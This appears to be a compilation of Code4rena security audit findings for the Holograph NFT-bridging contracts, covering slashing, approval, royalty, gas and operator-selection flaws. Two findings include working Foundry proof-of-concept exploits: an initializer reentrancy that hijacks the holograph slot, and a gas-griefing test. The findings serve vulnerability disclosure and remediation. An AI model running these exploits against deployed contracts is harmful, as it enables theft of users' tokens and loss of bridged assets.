See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/pedr02b2-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Diana-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L849-L857   # Vulnerability details  ## Impact Bond tokens (HLG) equal to the slash amount will get permanently stuck in the HolographOperator each time a job gets executed by someone who is not an (fallback-)operator.  ## Proof of Concept The `HolographOperator.executeJob` function can be executed by anyone after a certain passage of time:  ```js ... if (job.operator != address(0)) {     ...     if (job.operator != msg.sender) {         //perform time and gas price check         if (timeDifference < 6) {             // check msg.sender == correct fallback operator         }         // slash primary operator         uint256 amount = _getBaseBondAmount(pod);         _bondedAmounts[job.operator] -= amount;         _bondedAmounts[msg.sender] += amount;          //determine if primary operator retains his job         if (_bondedAmounts[job.operator] >= amount) {             ...         } else {             ...         }     } } // execute the job ``` In case `if (timeDifference < 6) {` gets skipped, the slashed amount will be assigned to the `msg.sender` regardless if that sender is currently an operator or not. The problem lies within the fact that if `msg.sender` is not already an operator at the time of executing the job, he cannot become one after, to retrieve the reward he got for slashing the primary operator. This is because the function `HolographOperator.bondUtilityToken` requires `_bondedAmounts` to be 0 prior to bonding and hence becoming an operator:  ```js require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, "HOLOGRAPH: operator is bonded"); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Assuming that it is intentional that non-operators can execute jobs (which could make sense, so that a user could finish a bridging process on his own, if none of the operators are doing it): remove the requirement that `_bondedAmounts` need to be 0 prior to bonding and becoming an operator so that non-operators can get access to the slashing reward by unbonding after.  Alternatively (possibly preferrable), just add a method to withdraw any `_bondedAmounts` of non-operators.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/hxzy-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ch0bu-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/oyc_109-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/oyc_109-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/peanuts-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/cryptostellar5-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Mukund-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382   # Vulnerability details  ## Impact  Wrong slashing calculation may create unfair punishment for operators that accidentally forgot to execute their job.  ## Proof of Concept  [Docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification): If an operator acts maliciously, a percentage of their bonded HLG will get slashed. Misbehavior includes (i) downtime, (ii) double-signing transactions, and (iii) abusing transaction speeds. 50% of the slashed HLG will be rewarded to the next operator to execute the transaction, and the remaining 50% will be burned or returned to the Treasury.  The docs also include a guide for the number of slashes and the percentage of bond slashed. However, in the contract, there is no slashing of percentage fees. Rather, the whole _getBaseBondAmount() fee is [slashed from the job.operator instead.](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382)  ```         uint256 amount = _getBaseBondAmount(pod);         /**          * @dev select operator that failed to do the job, is slashed the pod base fee          */         _bondedAmounts[job.operator] -= amount;         /**          * @dev the slashed amount is sent to current operator          */         _bondedAmounts[msg.sender] += amount; ```  Documentation states that only a portion should be slashed and the number of slashes should be noted down.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Implement the correct percentage of slashing and include a mapping to note down the number of slashes that an operator has
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Diana-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Jeiwan-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ReyAdmirado-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ReyAdmirado-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577   # Vulnerability details  ## Impact A source contract can burn and transfer NFTs of users without their permission. ## Proof of Concept Every Holographed ERC721 collection is paired with a source contract, which is the user created contract that's extended by the Holographed ERC721 contract ([HolographFactory.sol#L234-L246](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L234-L246)). A source contract, however, has excessive privileges in the Holographed ERC721. Specifically, it can burn and transfer users' NFTs without their approval ([HolographERC721.sol#L500](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500), [HolographERC721.sol#L577](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577)): ```solidity function sourceBurn(uint256 tokenId) external onlySource {   address wallet = _tokenOwner[tokenId];   _burn(wallet, tokenId); }  function sourceTransfer(address to, uint256 tokenId) external onlySource {   address wallet = _tokenOwner[tokenId];   _transferFrom(wallet, to, tokenId); } ```  While this might be desirable for extensibility and flexibility, this puts users at the risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key. ## Tools Used Manual review ## Recommended Mitigation Steps Consider removing the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` and requiring user approval to transfer or burn their tokens (`burn` and `safeTransferFrom` can be called by a source contract instead of `sourceBurn` and `sourceTransfer`).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/martin-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Shinchan-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ch0bu-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/karanctf-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/bin2chen-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/HolographERC721.sol#L392   # Vulnerability details  ## Impact beforeApprovalAll() / afterApprovalAll() can only pass "to" and "approved", missing "owner", if contract listening to this event,but does not know who approve it, so can not react to this event Basically, this event cannot be used  ## Proof of Concept ```   function setApprovalForAll(address to, bool approved) external { ....      if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {       require(SourceERC721().beforeApprovalAll(to, approved)); /***** only to/approved ,need owner     }        _operatorApprovals[msg.sender][to] = approved;      if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {       require(SourceERC721().afterApprovalAll(to, approved)); /***** only to/approved ,need owner     }   } ```  ## Tools Used  ## Recommended Mitigation Steps   add parameter: owner   ``` interface HolographedERC721 { ...  - function beforeApprovalAll(address _to, bool _approved) external returns (bool success); + function beforeApprovalAll(address owner, address _to, bool _approved) external returns (bool success);  - function afterApprovalAll(address _to, bool _approved) external returns (bool success); + function afterApprovalAll(address owner, address _to, bool _approved) external returns (bool success); ```  ```   function setApprovalForAll(address to, bool approved) external {      if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) { -     require(SourceERC721().beforeApprovalAll(to, approved));  +     require(SourceERC721().beforeApprovalAll(msg.sender,to, approved));      }        _operatorApprovals[msg.sender][to] = approved;      if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) { -      require(SourceERC721().afterApprovalAll(to, approved)); +      require(SourceERC721().afterApprovalAll(msg.sender,to, approved));     }   } ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/iepathos-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/catchup-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/vv7-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/erictee-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L147-L169   # Vulnerability details  When new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.  However, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`.   One way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.  ## Proof of Concept: ``` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import "forge-std/Test.sol"; import "../contracts/HolographFactory.sol"; import "../contracts/HolographRegistry.sol"; import "../contracts/Holograph.sol"; import "../contracts/enforcer/HolographERC20.sol";  //Contract used to show reentrancy in initializer contract SourceContract {     address public holographer;     MockContract public mc;      constructor() {          mc = new MockContract();     }      //function that reenters the holographer and sets this contract as the new holograph slot     function init(bytes memory initPayload) external returns(bytes4) {         assembly {             sstore(holographer.slot, caller())         }         bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32("0xabc"), address(this)), bytes("0x0"));          holographer.call(abi.encodeWithSignature("init(bytes)", initCode));         return InitializableInterface.init.selector;     }      function getRegistry() external view returns (address) {         return address(this);     }      function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {         return address(mc);     }      function isTheHolograph() external pure returns (bool) {         return true;     }  }  //simple extension contract to return easily during reinitialization contract MockContract {     constructor() {}      function init(bytes memory initPayload) external pure returns(bytes4) {         return InitializableInterface.init.selector;     } }  contract HolographTest is Test {     DeploymentConfig public config;     Verification public verifiedSignature;     HolographFactory public hf;     HolographRegistry public hr;     Holograph public h;     HolographERC20 public he20;      uint256 internal userPrivateKey;     address internal hrAdmin;     mapping(uint256 => bool) public _burnedTokens;     address internal user;     function setUp() public {         //Creating all of the required objects         hf = new HolographFactory();         hr = new HolographRegistry();         h = new Holograph();         he20 = new HolographERC20();          //Setting up the registry admin         hrAdmin = vm.addr(100);          //Creating factory, holograph, and registry init payloads         bytes memory hfInitPayload = abi.encode(address(h), address(hr));         hf.init(hfInitPayload);         bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));         h.init(hInitPayload);         bytes32[] memory reservedTypes = new bytes32[](1);         reservedTypes[0] = "0xabc";         bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);          //Setting up a contract type address for the ERC20 enforcer         vm.startPrank(hrAdmin, hrAdmin);         hr.init(hrInitPayload);         hr.setContractTypeAddress(reservedTypes[0], address(he20));         vm.stopPrank();          //Keys used to sign transaction for deployment         userPrivateKey = 0x1337;         user = vm.addr(userPrivateKey);     }      function testDeployShadyHolographer() public {         //setting up the configuration, contract type is not important         config.contractType = "0xabc";         config.chainType = 1;         config.salt = "0x12345";         config.byteCode = type(SourceContract).creationCode;         bytes memory initCode = "0x123";          //giving our token some semi-realistic metadata         config.initCode = abi.encode("HToken", "HT", uint8(18), uint256(0), "HTdomainSeparator", "HTdomainVersion", false, initCode);          //creating the hash for our user to sign         bytes32 hash = keccak256(             abi.encodePacked(                 config.contractType,                 config.chainType,                 config.salt,                 keccak256(config.byteCode),                 keccak256(config.initCode),                 user             ));          //signing the hash and creating the verified signature         (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);         verifiedSignature.r = r;         verifiedSignature.v = v;         verifiedSignature.s = s;          //deploying our new source contract and holographable contract pair         hf.deployHolographableContract(config, verifiedSignature, user);          //after the reentrancy has affected the initialization, we grab the holographer address from the registry         address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));          //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract         assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);     } } ``` ## Recommended Mitigation Steps  Consider checking whether the contract is in an "initializing" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements. 
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L272   # Vulnerability details  ## Impact According to EIP-721, we have for `approve`: ```solidity ///  Throws unless `msg.sender` is the current NFT owner, or an authorized ///  operator of the current owner. ``` An operator in the context of EIP-721 is someone who was approved via `setApprovalForAll`: ```solidity /// @notice Enable or disable approval for a third party ("operator") to manage ///  all of `msg.sender`'s assets /// @dev Emits the ApprovalForAll event. The contract MUST allow ///  multiple operators per owner. /// @param _operator Address to add to the set of authorized operators /// @param _approved True if the operator is approved, false to revoke approval function setApprovalForAll(address _operator, bool _approved) external; ``` Besides operators, there are also approved addresses for a token (for which `approve` is used). However, approved addresses can only transfer the token, see for instance the `safeTransferFrom` description: ```solidity /// @dev Throws unless `msg.sender` is the current owner, an authorized ///  operator, or the approved address for this NFT. ``` `HolographERC721` does not distinguish between authorized operators and approved addresses when it comes to the `approve` function. Because `_isApproved(msg.sender, tokenId)` is used there, an approved address can approve another address, which is a violation of the EIP (only authorized operators should be able to do so).  ## Proof Of Concept Bob calls `approve` to approve Alice on token ID 42 (that is owned by Bob). One week later, Bob sees that a malicious address was approved for his token ID 42 (e.g., because Alice got phished) and stole his token. Bob wonders how this is possible, because Alice should not have the permission to approve other addresses. However, becaue `HolographERC721` did not follow EIP-721, it was possible.  ## Recommended Mitigation Steps Follow the EIP, i.e. do not allow approved addresses to approve other addresses.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L366   # Vulnerability details  ## Impact According to EIP-721, we have the following for `safeTransferFrom`: ```solidity ///  (...) When transfer is complete, this function ///  checks if `_to` is a smart contract (code size > 0). If so, it calls ///  `onERC721Received` on `_to` and throws if the return value is not ///  `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`. ``` According to the specification, the function must therefore always call `onERC721Received`, not only when it has determined via ERC-165 that the contract provides this function. Note that in the EIP, the provided interface for `ERC721TokenReceiver` does not mention ERC-165. For the token itself, we have: `interface ERC721 /* is ERC165 */ {` However, for the receiver, the provided interface there is just: `interface ERC721TokenReceiver {` This leads to failed transfers when they should not fail, because many receivers will just implement the `onERC721Received` function (which is sufficient according to the EIP), and not `supportsInterface` for ERC-165 support.  ## Proof Of Concept Let's say a receiver just implements the `IERC721Receiver` from OpenZeppelin: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol Like the provided interface in the EIP itself, this interface does not derive from EIP-165. All of these receivers (which are most receivers in practice) will not be able to receive those tokens, because the `require` statement (that checks for ERC-165 support) reverts.  ## Recommended Mitigation Steps Remove the ERC-165 check in the `require` statement (like OpenZeppelin does: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Jujic-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L665-L675   # Vulnerability details  ## Impact  bidShares returned are incorrect leading to incorrect royalties  ## Proof of Concept  [Zora Market](https://etherscan.io/address/0xe5bfab544eca83849c53464f85b7164375bdaac1#code#F1#L113)      function isValidBidShares(BidShares memory bidShares)         public         pure         override         returns (bool)     {         return             bidShares.creator.value.add(bidShares.owner.value).add(                 bidShares.prevOwner.value             ) == uint256(100).mul(Decimal.BASE);     }  Above you can see the Zora market lines that validate bidShares, which shows that Zora market bidShare.values should be percentages written out to 18 decimals. However PA1D#bidSharesForToken sets the bidShares.creator.value to the raw basis points set by the owner, which is many order of magnitudes different than expected.     ## Tools Used  Manual Review  ## Recommended Mitigation Steps  To return the proper value, basis points returned need to be adjusted. Convert from basis points to percentage by dividing by 10 ** 2 (100) then scale to 18 decimals. The final result it to multiple the basis point by 10 ** (18 - 2) or 10 ** 16:       function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {         // this information is outside of the scope of our         bidShares.prevOwner.value = 0;         bidShares.owner.value = 0;         if (_getReceiver(tokenId) == address(0)) {     -       bidShares.creator.value = _getDefaultBp();     +       bidShares.creator.value = _getDefaultBp() * (10 ** 16);         } else {     -       bidShares.creator.value = _getBp(tokenId);     +       bidShares.creator.value = _getBp(tokenId) * (10 ** 16);         }         return bidShares;     }
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L316   # Vulnerability details  There's a check at line 316 that verifies that there's enough gas left to execute the `HolographBridge.bridgeInRequest()` with the `gasLimit` set by the user, however the actual amount of gas left during the call is less than that (mainly due to the 1/64 rule, see below). An attacker can use that gap to fail the job while still having the `executeJob()` function complete.   ## Impact The owner of the bridged token would loose access to the token since the job failed.  ## Proof of Concept Besides using a few units of gas between the check and the actual call, there's also a rule that only 63/64 of the remaining gas would be dedicated to an (external) function call. Since there are 2 external function calls done (`nonRevertingBridgeCall()` and the actual call to the bridge) ~2/64 of the gas isn't sent to the bridge call and can be used after the bridge call runs out of gas.   The following PoC shows that if the amount of gas left before the call is at least 1 million then the execution can continue after the bridge call fails:  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0;  import "forge-std/Test.sol";  contract ContractTest is Test {     event FailedOperatorJob(bytes32 jobHash);     uint256 private _inboundMessageCounter;     mapping(bytes32 => bool) private _failedJobs;     constructor(){         _inboundMessageCounter = 5;     }     function testGas64() public {         this.entryPoint{gas:1000000}();     }      Bridge bridge = new Bridge();     event GasLeftAfterFail(uint left);      function entryPoint() public {          console2.log("Gas left before call: ", gasleft());          bytes32 hash = 0x987744358512a04274ccfb3d9649da3c116cd6b19c535e633ef8529a80cb06a0;          try this.intermediate(){         }catch{             // check out how much gas is left after the call to the bridge failed             console2.log("Gas left after failure: ", gasleft());             // simulate operations done after failure             _failedJobs[hash] = true;             emit FailedOperatorJob(hash);         }         ++_inboundMessageCounter;         console2.log("Gas left at end: ", gasleft());      }      function intermediate() public{         bridge.bridgeCall();     } }   contract Bridge{     event Done(uint gasLeft);      uint256[] myArr;      function bridgeCall() public {         for(uint i =1; i <= 100; i++){             myArr.push(i);         }         // this line would never be reached, we'll be out of gas beforehand         emit Done(gasleft());     } }  ```  Output of PoC: ```   Gas left before call:  999772   Gas left after failure:  30672   Gas left at end:  1628 ```  Side note: due to some bug in forge `_inboundMessageCounter` would be considered warm even though it's not necessarily the case. However in a real world scenario we can warm it up if the selected operator is a contract and we'er using another operator contract to execute a job in the same tx beforehand.   Reference for the 1/64 rule - [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md). Also check out [evm.codes](https://www.evm.codes/#f1?fork=grayGlacier:~:text=From%20the%20Tangerine%20Whistle%20fork%2C%20gas%20is%20capped%20at%20all%20but%20one%2064th%20(remaining_gas%20/%2064)%20of%20the%20remaining%20gas%20of%20the%20current%20context.%20If%20a%20call%20tries%20to%20send%20more%2C%20the%20gas%20is%20changed%20to%20match%20the%20maximum%20allowed.).   ## Recommended Mitigation Steps Modify the required amount of gas left to gasLimit + any amount of gas spent before reaching the `call()`, then multiply it by 32/30 to mitigate the 1/64 rule (+ some margin of safety maybe).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L255   # Vulnerability details  ## Impact  If the following conditions have been met: * The selected operator doesn't complete the job, either intentionally (they're sacrificing their bonded amount to harm the token owner) or innocently (hardware failure that caused a loss of access to the wallet)  * Gas price has spiked, and isn't going down than the `gasPrice` set by the user in the bridge out request  Then the bridging request wouldn't complete and the token owner would loos access to the token till the gas price goes back down again.   ## Proof of Concept The fact that no one but the selected operator can execute the job in case of a gas spike has been proven by the test ['Should fail if there has been a gas spike'](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/test/14_holograph_operator_tests.ts#L834-L844) provided by the sponsor.  An example of a price spike can be in the recent month in the Ethereum Mainnet where the min gas price was 3 at Oct 8, but jumped to 14 the day after and didn't go down since then (the min on Oct 9 was lower than the avg of Oct8, but users might witness a momentarily low gas price and try to hope on it). See the [gas price chat on Etherscan](https://etherscan.io/chart/gasprice) for more details.  ## Recommended Mitigation Steps  In case of a gas price spike, instead of refusing to let other operators to execute the job, let them execute the job without slashing the selected operator. This way, after a while also the owner can execute the job and pay the gas price.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539 https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144   # Vulnerability details  # H001 An attacker can manipulate each pod and gain an advantage over the remainder Operators  ## Impact  In [contracts/HolographOperator.sol#crossChainMessage](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539), each Operator is selected by:  - Generating a random number ([L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499)) - A pod is selected by dividing the random with the total number of pods, and using the remainder ([L503](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L503)) - An Operator of the selected pod is chosen using the **same** random and dividing by the total number of operators ([L511](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L511)).  This creates an unintended bias since the first criterion (the `random`) is used for both selecting the pod and selecting the Operator, as explained in a previous issue (`M001-Biased distribution`). In this case, an attacker knowing this flaw can continuously monitor the contracts state and see the current number of pods and Operators. Accordingly to the [documentation](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection) and provided [flow](https://github.com/code-423n4/2022-10-holograph/blob/main/docs/IMPORTANT_FLOWS.md#joining-pods):  * An Operator can easily join and leave a pod, albeit when leaving a small fee is paid * An Operator can only join one pod, but an attacker can control multiple Operators * The attacker can then enter and leave a pod to increase (unfairly) his odds of being selected for a job  Honest Operators may feel compelled to leave the protocol if there are no financial incentives (and lose funds in the process), which can also increase the odds of leaving the end-users at the hands of a malicious Operator.  ## Proof of Concept  Consider the following simulation for 10 pods with a varying number of operators follows (X → "does not apply"): | Pod n | Pon len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |  | P0 | 10 | 615 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 615 | | P1 | 3 | 203 | 205 | 207 | X | X | X | X | X | X | X | 615 | | P2 | 6 | 208 | 0 | 233 | 0 | 207 | 0 | X | X | X | X | 648 | | P3 | 9 | 61 | 62 | 69 | 70 | 65 | 69 | 61 | 60 | 54 | X | 571 | | P4 | 4 | 300 | 0 | 292 | 0 | X | X | X | X | X | X | 592 | | P5 | 10 | 0 | 0 | 0 | 0 | 0 | 586 | 0 | 0 | 0 | 0 | 586 | | P6 | 2 | 602 | 0 | X | X | X | X | X | X | X | X | 602 | | P7 | 7 | 93 | 93 | 100 | 99 | 76 | 74 | 78 | X | X | X | 613 | | P8 | 2 | 586 | 0 | X | X | X | X | X | X | X | X | 586 | | P9 | 6 | 0 | 190 | 0 | 189 | 0 | 192 | X | X | X | X | 571 |  At this stage, an attacker Mallory joins the protocol and scans the protocol (or interacts with - e.g. `getTotalPods`, `getPodOperatorsLength`). As an example, after considering the potential benefits, she chooses pod `P9` and sets up some bots `[B1, B2, B3]`. The number of Operators will determine the odds, so:  | Pod P9 | Alt len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |  | P9A | 4 | 0 | 276 | 0 | 295 | X | X | X | X | X | X | 571 | | P9B | 5 | 0 | 0 | 0 | 0 | 571 | X | X | X | X | X | 571 | | P9 | 6 | 0 | 190 | 0 | 189 | 0 | 192 | X | X | X | X | 571 | | P9C | 7 | 66 | 77 | 81 | 83 | 87 | 90 | 87 | X | X | X | 571 | | P9D | 8 | 0 | 127 | 0 | 147 | 0 | 149 | 0 | 148 | X | X | 571 |  And then:  1. She waits for the next job to fall in `P9` and keeps an eye on the number of pods, since it could change the odds. 2. After an Operator is selected (he [pops](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L518) from the array), the number of available Operators change to 5, and the odds change to `P9B`. 3. She deploys `B1` and it goes to position `Op5`, odds back to `P9`. If the meantime the previously chosen Operator comes back to the `pod`, see the alternative timeline. 4. She now has 1/3 of the probability to be chosen for the next job: 4.1 If she is not chosen, [she will assume the position](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144) of the chosen Operator, and deploys `B2` to maintain the odds of `P9` and controls 2/3 of the pod. 4.2 If she is chosen, she chooses between employing another bot or waiting to execute the job to back to the pod (keeping the original odds). 5. She can then iterate multiple times to swap to the remainder of possible indexes via step 4.1.   Alternative timeline (from previous 3.): 1. The chosen Operator finishes the job and goes back to the pod. Now there's 7 members with uniform odds (`P9C`). 2. Mallory deploys `B2` and the length grows to 8, the odds turn to `P9D` and she now controls two of the four possible indexes from which she can be chosen.  There are a lot of ramifications and possible outcomes that Mallory can manipulate to increase the odds of being selected in her favor.  ## Tools Used  Manual  ## Recommended Mitigation Steps  Has stated in `M001-Biased distribution`, use two random numbers for pod and Operator selection. Ideally, an independent source for randomness should be used, but following the assumption that the one used in [L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499) is safe enough, using the most significant bits (e.g. `random >> 128`) should guarantee an unbiased distribution. Also, reading the [EIP-4399](https://eips.ethereum.org/EIPS/eip-4399) could be valuable.  Additionally, since randomness in blockchain is always tricky to achieve without an oracle provider, consider adding additional controls (e.g. waiting times before joining each pod) to increase the difficulty of manipulating the protocol.  And finally, in this particular case, removing the swapping mechanism (moving the last index to the chosen operator's current index) for another mechanism (shifting could also create conflicts [with backup operators?](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L358-L370)) could also increase the difficulty of manipulating a particular pod.  
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/saneryee-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ret2basic-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xsam-G.md).
